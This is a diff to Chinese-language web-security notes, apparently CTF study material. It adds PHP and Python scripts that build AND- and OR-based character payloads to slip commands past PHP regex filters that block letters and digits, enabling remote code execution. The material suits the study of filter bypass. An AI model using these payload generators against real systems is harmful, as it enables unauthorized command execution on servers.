@@ -1339,7 +1339,7 @@ print(r.text)
 
 需要没过滤符号: `~`
 
-###### 构造取反 url 的脚本 (最简方法)
+###### 构造取反 url 的通用脚本 (最简方法)
 
 ```python
 def action(s):
@@ -1534,6 +1534,166 @@ while True:
 执行该脚本即可构建异或字符，如图
 
 ![image-20230905094229433](static/img/image-20230905094229433.png)
+
+##### 与
+
+用法和[异或](#####异或)一样，只是代码不同
+
+脚本1:与绕过.php
+
+```php
+<?php
+$preg = '/[0-9a-z]/i';
+  
+$myfile = fopen("and_rce.txt", "w");
+$contents="";
+for ($i=0; $i < 256; $i++) { 
+	for ($j=0; $j <256 ; $j++) { 
+
+		if($i<16){
+			$hex_i='0'.dechex($i);
+		}
+		else{
+			$hex_i=dechex($i);
+		}
+		if($j<16){
+			$hex_j='0'.dechex($j);
+		}
+		else{
+			$hex_j=dechex($j);
+		}
+		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
+					echo "";
+    }
+  
+		else{
+		$a='%'.$hex_i;
+		$b='%'.$hex_j;
+		$c=(urldecode($a)&urldecode($b));
+		if (ord($c)>=32&ord($c)<=126) {
+			$contents=$contents.$c." ".$a." ".$b."\n";
+		}
+	}
+
+}
+}
+fwrite($myfile,$contents);
+fclose($myfile);
+```
+
+脚本2:and_rce.py
+
+```python
+# -*- coding: utf-8 -*-
+import requests
+import urllib
+from sys import *
+import os
+def action(arg):
+   s1=""
+   s2=""
+   for i in arg:
+       f=open("and_rce.txt","r")
+       while True:
+           t=f.readline()
+           if t=="":
+               break
+           if t[0]==i:
+               #print(i)
+               s1+=t[2:5]
+               s2+=t[6:9]
+               break
+       f.close()
+   output="(\""+s1+"\"%26\""+s2+"\")"
+   return(output)
+   
+while True:
+   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
+   print(param)
+```
+
+##### 或
+
+用法和[异或](#####异或)一样，只是代码不同
+
+脚本1:或绕过.php
+
+```php
+<?php
+$preg = '/[0-9]|[a-z]/i';
+
+$myfile = fopen("or_rce.txt", "w");
+$contents="";
+for ($i=0; $i < 256; $i++) { 
+	for ($j=0; $j <256 ; $j++) { 
+
+		if($i<16){
+			$hex_i='0'.dechex($i);
+		}
+		else{
+			$hex_i=dechex($i);
+		}
+		if($j<16){
+			$hex_j='0'.dechex($j);
+		}
+		else{
+			$hex_j=dechex($j);
+		}
+		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
+					echo "";
+    }
+  
+		else{
+		$a='%'.$hex_i;
+		$b='%'.$hex_j;
+		$c=(urldecode($a)|urldecode($b));
+		if (ord($c)>=32&ord($c)<=126) {
+			$contents=$contents.$c." ".$a." ".$b."\n";
+		}
+	}
+
+}
+}
+fwrite($myfile,$contents);
+fclose($myfile);
+```
+
+脚本2:or_rce.py
+
+```python
+# -*- coding: utf-8 -*-
+import requests
+import urllib
+from sys import *
+import os
+def action(arg):
+   s1=""
+   s2=""
+   for i in arg:
+       f=open("or_rce.txt","r")
+       while True:
+           t=f.readline()
+           if t=="":
+               break
+           if t[0]==i:
+               #print(i)
+               s1+=t[2:5]
+               s2+=t[6:9]
+               break
+           # elif t[0].lower()==i:
+           #     s1+=t[2:5]
+           #     s2+=t[6:9]
+           #     break
+       f.close()
+   output="('"+s1+"'|'"+s2+"')"
+   return(output)
+   
+while True:
+   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
+   print(param)
+```
+
+
 
 ##### 自增漏洞
 
